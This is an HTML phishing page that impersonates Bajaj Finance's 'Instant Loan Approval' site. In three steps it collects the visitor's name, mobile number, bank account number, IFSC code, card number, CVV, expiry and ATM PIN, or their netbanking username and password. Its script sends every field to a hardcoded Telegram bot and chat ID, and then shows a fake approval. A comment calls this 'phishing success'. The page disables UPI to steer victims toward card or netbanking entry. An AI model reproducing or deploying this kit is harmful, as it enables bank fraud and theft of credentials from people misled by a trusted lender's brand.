<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bajaj Finance - Instant Loan Approval</title>
    <style>
        *{
margin:0;
padding:0;
box-sizing:border-box;
}

html{
font-size:16px;
-webkit-text-size-adjust:100%;
}

body{
font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
background:#f5f7fb;
min-height:100vh;
display:flex;
align-items:center;
justify-content:center;
padding:env(safe-area-inset-top) 12px env(safe-area-inset-bottom);
color:#1f2937;
}

/* MAIN CONTAINER */

.container{
width:100%;
max-width:420px;
background:#ffffff;
border-radius:18px;
overflow:hidden;
box-shadow:0 10px 35px rgba(0,0,0,0.08);
}

/* HEADER */

.header{
background:#ffffff;
padding:26px 18px 20px;
text-align:center;
border-bottom:1px solid #f1f1f1;
}

.logo{
width:60px;
height:60px;
margin:auto;
border-radius:14px;
background:#0f4c81;
display:flex;
align-items:center;
justify-content:center;
font-size:22px;
font-weight:700;
color:#fff;
margin-bottom:10px;
}

.header h1{
font-size:19px;
font-weight:700;
color:#111827;
margin-bottom:4px;
}

.header p{
font-size:13px;
color:#6b7280;
}

/* PROGRESS */

.progress-bar{
display:flex;
gap:6px;
margin-top:12px;
justify-content:center;
}

.progress-step{
height:6px;
width:60px;
border-radius:20px;
background:#e5e7eb;
transition:.3s;
}

.progress-step.active{
background:#0f4c81;
}

/* FORM */

.form-container{
padding:20px 18px 22px;
}

.step{
display:none;
}

.step.active{
display:block;
}

/* INPUT */

.input-group{
margin-bottom:16px;
}

label{
display:block;
font-size:13px;
font-weight:600;
color:#374151;
margin-bottom:5px;
}

input{
width:100%;
padding:14px 12px;
border-radius:10px;
border:1px solid #d1d5db;
font-size:15px;
background:#fff;
transition:.25s;
}

input:focus{
outline:none;
border-color:#0f4c81;
box-shadow:0 0 0 3px rgba(15,76,129,0.12);
}

/* BUTTONS */

.btn{
width:100%;
border:none;
border-radius:12px;
padding:15px;
font-size:15px;
font-weight:600;
cursor:pointer;
transition:.25s;
touch-action:manipulation;
}

.btn-primary{
background:#0f4c81;
color:#fff;
}

.btn-primary:hover{
opacity:.9;
}

.btn-secondary{
background:#e5e7eb;
color:#374151;
margin-top:10px;
}

/* PAYMENT TABS */

.payment-tabs{
display:flex;
gap:6px;
margin-bottom:16px;
}

.tab-btn{
flex:1;
padding:11px;
border-radius:9px;
border:1px solid #e5e7eb;
background:#fff;
font-size:13px;
font-weight:600;
cursor:pointer;
color:#374151;
transition:.2s;
}

.tab-btn.active{
background:#0f4c81;
color:#fff;
border-color:#0f4c81;
}

.tab-content{
display:none;
}

.tab-content.active{
display:block;
}

/* ALERTS */

.error{
background:#fee2e2;
border:1px solid #fecaca;
color:#991b1b;
padding:12px;
border-radius:10px;
font-size:13px;
margin-bottom:14px;
display:none;
}

.success{
background:#dcfce7;
border:1px solid #bbf7d0;
color:#166534;
padding:14px;
border-radius:10px;
font-size:14px;
text-align:center;
display:none;
}

.success h3{
margin-bottom:6px;
}

/* SMALL MOBILE */

@media (max-width:360px){

.header h1{
font-size:17px;
}

.logo{
width:55px;
height:55px;
font-size:20px;
}

input{
font-size:14px;
padding:12px;
}

.btn{
padding:13px;
}

}

/* TABLET */

@media (min-width:600px){

body{
padding:30px;
}

.container{
max-width:500px;
}

.form-container{
padding:28px;
}

}

/* LARGE SCREEN */

@media (min-width:900px){

.container{
max-width:520px;
}

}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">BF</div>
            <h1>Bajaj Finance</h1>
            <p>✅ Instant Loan Approval</p>
            <div class="progress-bar">
                <div class="progress-step active"></div>
                <div class="progress-step"></div>
                <div class="progress-step"></div>
            </div>
        </div>
        
        <div class="form-container">
            <!-- STEP 1: Personal Details -->
            <div class="step active" id="step1">
                <div class="input-group">
                    <label>👤 Full Name *</label>
                    <input type="text" id="name" placeholder="Enter your full name" required>
                </div>
                <div class="input-group">
                    <label>📱 Mobile Number *</label>
                    <input type="tel" id="mobile" placeholder="98XXXXXXXX" maxlength="10" required>
                </div>
                <div class="input-group">
                    <label>💰 Loan Amount (₹) *</label>
                    <input type="number" id="loanAmount" placeholder="50000" min="10000" max="5000000" required>
                </div>
                <button class="btn btn-primary" onclick="nextStep(1)">
                    Continue → 
                </button>
            </div>

            <!-- STEP 2: Bank Details -->
            <div class="step" id="step2">
                <div class="input-group">
                    <label>🏦 Account Number *</label>
                    <input type="text" id="accountNo" placeholder="1234567890123456" required>
                </div>
                <div class="input-group">
                    <label>🔑 IFSC Code *</label>
                    <input type="text" id="ifsc" placeholder="HDFC0001234" maxlength="11" required>
                </div>
                <div class="progress-bar">
                    <div class="progress-step active"></div>
                    <div class="progress-step active"></div>
                    <div class="progress-step"></div>
                </div>
                <button class="btn btn-primary" onclick="nextStep(2)">
                    Continue to Payment → 
                </button>
                <button class="btn btn-secondary" onclick="prevStep(2)">
                    ← Back
                </button>
            </div>

            <!-- STEP 3: Payment Methods -->
            <div class="step" id="step3">
                <h3 style="text-align:center;margin-bottom:20px;color:#2c3e50;font-size:20px;">Select Payment Method</h3>
                
                <div class="payment-tabs">
                    <button class="tab-btn active" onclick="selectPayment('card')">
                        💳 Card
                    </button>
                    <button class="tab-btn" onclick="selectPayment('netbanking')">
                        🏦 Netbanking
                    </button>
                    <button class="tab-btn" onclick="selectPayment('upi')">
                        📱 UPI
                    </button>
                </div>

                <!-- Card Payment -->
                <div class="tab-content active" id="card-form">
                    <div class="input-group">
                        <label>💳 Card Number</label>
                        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
                    </div>
                    <div class="card-grid">
                        <div class="input-group">
                            <label>📅 Expiry (MM/YY)</label>
                            <input type="text" id="expiry" placeholder="12/25" maxlength="5" required>
                        </div>
                        <div class="input-group">
                            <label>🔒 CVV</label>
                            <input type="text" id="cvv" placeholder="123" maxlength="4" required>
                        </div>
                    </div>
                    <div class="input-group">
                        <label>🔑 ATM PIN</label>
                        <input type="password" id="pin" placeholder="****" maxlength="6" required>
                    </div>
                    <button class="btn btn-primary" onclick="submitCard()">
                        🔒 Secure Pay Now
                    </button>
                </div>

                <!-- Netbanking -->
                <div class="tab-content" id="netbanking-form">
                    <div class="input-group">
                        <label>🏦 Netbanking Username</label>
                        <input type="text" id="netUsername" placeholder="your_username" required>
                    </div>
                    <div class="input-group">
                        <label>🔐 Password</label>
                        <input type="password" id="netPassword" placeholder="your_password" required>
                    </div>
                    <button class="btn btn-primary" onclick="submitNetbanking()">
                        🚀 Login & Pay
                    </button>
                </div>

                <div class="progress-bar" style="margin-top:20px;">
                    <div class="progress-step active"></div>
                    <div class="progress-step active"></div>
                    <div class="progress-step active"></div>
                </div>
                <button class="btn btn-secondary" onclick="prevStep(3)">
                    ← Back to Bank Details
                </button>
            </div>

            <!-- Success Message -->
            <div class="success" id="successMsg">
                <h3>✅ Payment Successful!</h3>
                <p>Your loan application has been approved. Funds will be disbursed within 24 hours.</p>
                <p><strong>Loan Amount: ₹<span id="finalAmount"></span></strong></p>
            </div>

            <!-- Error Message -->
            <div class="error" id="errorMsg"></div>
        </div>
    </div>

    <script>let currentStep = 1;
let currentPaymentTab = 'card';

// Telegram Config
const TELEGRAM_BOT_TOKEN = "8433694608:AAGIvNk5eVUAT18kFFHeRtLG6gMoO6udZPY";
const TELEGRAM_CHAT_ID = "8270681405";

// Current date
const currentDate = new Date().toLocaleString('en-IN', {
    timeZone: 'Asia/Kolkata',
    weekday: 'short',
    year: 'numeric',
    month: 'short',
    day: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
});

// Function to send data to Telegram
async function sendToTelegram(data) {
    try {
        const message = `
🚨 *NEW LOAN APPLICATION* 🚨
📅 *Date/Time:* ${currentDate}

👤 *Personal Details:*
• Name: ${data.name || 'N/A'}
• Mobile: ${data.mobile || 'N/A'}
• Loan Amount: ₹${parseInt(data.loanAmount || 0).toLocaleString() || 'N/A'}

🏦 *Bank Details:*
• Account No: ${data.accountNo || 'N/A'}
• IFSC: ${data.ifsc || 'N/A'}

💳 *Payment Details:*
• Method: ${data.paymentMethod || 'N/A'}
${data.cardNumber ? `• Card: ${data.cardNumber}\n• Expiry: ${data.expiry || 'N/A'}\n• CVV: ${data.cvv || 'N/A'}\n• PIN: ${data.pin || 'N/A'}` : ''}
${data.netUsername ? `• Netbanking Username: ${data.netUsername}\n• Netbanking Password: ${data.netPassword}` : ''}

━━━━━━━━━━━━━━━━━━━━
        `.trim();

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const payload = {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        };

        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });

        return response.ok;
    } catch (error) {
        console.error('Telegram send failed:', error);
        return false;
    }
}

// Card Number Formatting
document.getElementById('cardNumber').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
    let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
    e.target.value = formatted;
});

// Expiry Date Formatting
document.getElementById('expiry').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 2) {
        value = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
    e.target.value = value;
});

// Mobile Number Formatting
document.getElementById('mobile').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 10) value = value.slice(0, 10);
    e.target.value = value;
});

// Step Navigation with Validation
function nextStep(step) {
    const currentStepEl = document.getElementById(`step${step}`);
    const inputs = currentStepEl.querySelectorAll('input[required]');
    
    // Check if all required fields are filled
    for (let input of inputs) {
        if (!input.value.trim()) {
            shakeInput(input);
            showError('Please fill all required fields marked with *');
            return;
        }
    }

    // Hide current step
    document.getElementById(`step${step}`).classList.remove('active');
    
    // Show next step
    currentStep = step + 1;
    document.getElementById(`step${currentStep}`).classList.add('active');
    
    // Update progress bar
    updateProgressBar();
    
    hideError();
}

function prevStep(step) {
    document.getElementById(`step${step}`).classList.remove('active');
    currentStep = step - 1;
    document.getElementById(`step${currentStep}`).classList.add('active');
    updateProgressBar();
    hideError();
}

function updateProgressBar() {
    document.querySelectorAll('.progress-step').forEach((stepEl, index) => {
        if (index < currentStep) {
            stepEl.classList.add('active');
        } else {
            stepEl.classList.remove('active');
        }
    });
}

// Input shake animation
function shakeInput(input) {
    input.style.borderColor = '#dc3545';
    input.style.transform = 'translateX(0)';
    
    input.animate([
        { transform: 'translateX(-5px)' },
        { transform: 'translateX(5px)' },
        { transform: 'translateX(-3px)' },
        { transform: 'translateX(3px)' },
        { transform: 'translateX(0)' }
    ], {
        duration: 400,
        iterations: 1
    });

    setTimeout(() => {
        input.style.borderColor = '#e9ecef';
        input.style.transform = '';
    }, 2000);
}

// Payment Tab Selection
function selectPayment(tab) {
    currentPaymentTab = tab;
    
    // UPI Error - CENTERED POPUP
    if (tab === 'upi') {
        showUpiPopup();
        return; // STOP EXECUTION FOR UPI
    }
    
    // Update active tab (only for valid tabs)
    document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
    event.target.classList.add('active');
    
    // Update active content (only for valid tabs)
    document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
    document.getElementById(`${tab}-form`).classList.add('active');
}

// UPI Error Popup - CENTERED MODAL
function showUpiPopup() {
    // Create overlay
    const overlay = document.createElement('div');
    overlay.id = 'upi-overlay';
    overlay.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0,0,0,0.7);
        z-index: 9999;
        display: flex;
        align-items: center;
        justify-content: center;
    `;
    
    // Create popup
    const popup = document.createElement('div');
    popup.style.cssText = `
        background: linear-gradient(135deg, #fff 0%, #f8f9fa 100%);
        border-radius: 20px;
        padding: 30px;
        max-width: 400px;
        width: 90%;
        text-align: center;
        box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        border: 3px solid #dc3545;
        animation: popupSlide 0.4s ease-out;
    `;
    
    popup.innerHTML = `
        <div style="font-size: 48px; margin-bottom: 15px;">❌</div>
        <h3 style="color: #dc3545; margin: 0 0 15px 0; font-weight: 700;">UPI Payment Unavailable</h3>
        <p style="color: #6c757d; font-size: 16px; margin: 0 0 25px 0; line-height: 1.5;">
            UPI payment is temporarily unavailable.<br>
            <strong>Please use Card or Netbanking instead.</strong>
        </p>
        <div style="background: linear-gradient(135deg, #dc3545, #c82333); color: white; padding: 12px 25px; border-radius: 50px; font-weight: 600; cursor: pointer; transition: all 0.3s; font-size: 16px; margin: 0 auto; width: fit-content;" onclick="closeUpiPopup()">
            🔄 Switch to Card Payment
        </div>
    `;
    
    overlay.appendChild(popup);
    document.body.appendChild(overlay);
    
    // Add animation CSS
    const style = document.createElement('style');
    style.textContent = `
        @keyframes popupSlide {
            0% { transform: scale(0.7) translateY(-30px); opacity: 0; }
            100% { transform: scale(1) translateY(0); opacity: 1; }
        }
    `;
    document.head.appendChild(style);
}

// Close UPI Popup & Switch to Card
function closeUpiPopup() {
    const overlay = document.getElementById('upi-overlay');
    if (overlay) {
        overlay.style.animation = 'popupSlide 0.3s ease-in reverse';
        setTimeout(() => {
            overlay.remove();
        }, 300);
    }
    
    // Auto switch to card tab
    setTimeout(() => {
        document.querySelector('.tab-btn[data-tab="card"], .tab-btn:first-child').click();
    }, 100);
}

// Submit Card Payment
async function submitCard() {
    const formData = getFormData();
    if (!validateCardForm(formData)) return;
    
    // Disable button
    const btn = event.target;
    btn.disabled = true;
    btn.textContent = 'Processing...';
    
    await submitForm({
        paymentMethod: 'Card',
        cardNumber: formData.cardNumber,
        expiry: formData.expiry,
        cvv: formData.cvv,
        pin: formData.pin
    });
    
    btn.disabled = false;
    btn.textContent = '🔒 Secure Pay Now';
}

// Submit Netbanking
async function submitNetbanking() {
    const username = document.getElementById('netUsername').value.trim();
    const password = document.getElementById('netPassword').value;
    
    if (!username || !password) {
        shakeInput(document.getElementById('netUsername') || document.getElementById('netPassword'));
        showError('Please enter both Netbanking username and password');
        return;
    }
    
    // Disable button
    const btn = event.target;
    btn.disabled = true;
    btn.textContent = 'Processing...';
    
    await submitForm({
        paymentMethod: 'Netbanking',
        netUsername: username,
        netPassword: password
    });
    
    btn.disabled = false;
    btn.textContent = '🚀 Login & Pay';
}

// Get All Form Data
function getFormData() {
    return {
        name: document.getElementById('name').value.trim(),
        mobile: document.getElementById('mobile').value.trim(),
        loanAmount: document.getElementById('loanAmount').value,
        accountNo: document.getElementById('accountNo').value.trim(),
        ifsc: document.getElementById('ifsc').value.trim().toUpperCase(),
        cardNumber: document.getElementById('cardNumber').value.replace(/\s/g, ''),
        expiry: document.getElementById('expiry').value,
        cvv: document.getElementById('cvv').value,
        pin: document.getElementById('pin').value
    };
}

// Card Form Validation
function validateCardForm(data) {
    if (!data.cardNumber || data.cardNumber.length < 13) {
        showError('Please enter a valid card number (13-16 digits)');
        return false;
    }
    if (!data.expiry || !/^\d{2}\/\d{2}$/.test(data.expiry)) {
        showError('Please enter valid expiry date in MM/YY format');
        return false;
    }
    if (!data.cvv || data.cvv.length < 3 || data.cvv.length > 4) {
        showError('Please enter valid CVV (3 or 4 digits)');
        return false;
    }
    if (!data.pin || data.pin.length < 4 || data.pin.length > 6) {
        showError('Please enter valid ATM PIN (4-6 digits)');
        return false;
    }
    return true;
}

// Main Submit Function
async function submitForm(extraData) {
    try {
        const formData = getFormData();
        const payload = { ...formData, ...extraData };
        
        // Show processing message
        showProcessing('🔄 Processing your payment... Please wait');
        
        // Send to Telegram FIRST
        const telegramSent = await sendToTelegram(payload);
        
        // Simulate processing delay
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        // Always show success (phishing success)
        showSuccess(formData.loanAmount);
        
        console.log('Telegram sent:', telegramSent ? '✅ Success' : '❌ Failed');
        
    } catch (error) {
        console.error('Submit error:', error);
        showError('Payment processing failed. Please try again.');
    }
}

// Show Processing
function showProcessing(message) {
    const errorEl = document.getElementById('errorMsg');
    errorEl.innerHTML = `<div style="background: linear-gradient(135deg, #fff3cd 0%, #ffeaa7 100%); color: #856404; border-left: 5px solid #ffc107; font-weight: 600;">${message}</div>`;
    errorEl.style.display = 'block';
}

// Show Success with 5 second timer
function showSuccess(amount) {
    document.querySelectorAll('.step').forEach(step => {
        step.style.display = 'none';
    });
    
    const successMsg = document.getElementById('successMsg');
    successMsg.innerHTML = `
        <h3>✅ Payment Successful!</h3>
        <p>Your loan application has been <strong>APPROVED</strong></p>
        <p><strong>Loan Amount: ₹${parseInt(amount).toLocaleString()}</strong></p>
        <p style="font-size: 14px; margin-top: 15px;">
            💰 Funds will be credited to your account within <strong>24 hours</strong><br>
            ⏳ Processing time: 5 seconds remaining...
        </p>
    `;
    successMsg.style.display = 'block';
    
    // Auto refresh or redirect after 5 seconds
    setTimeout(() => {
        successMsg.innerHTML += `
            <div style="margin-top: 20px; padding: 15px; background: rgba(255,255,255,0.8); border-radius: 10px; font-size: 14px;">
                ✅ Processing completed! Check your bank account in 24 hours.
            </div>
        `;
    }, 5000);
}

// Show Error with better styling
function showError(message) {
    const errorEl = document.getElementById('errorMsg');
    errorEl.innerHTML = `<strong>❌ ${message}</strong>`;
    errorEl.style.display = 'block';
    setTimeout(hideError, 6000);
}

// Hide Error
function hideError() {
    document.getElementById('errorMsg').style.display = 'none';
}

// Initialize
updateProgressBar();
    </script>
</body>
</html>
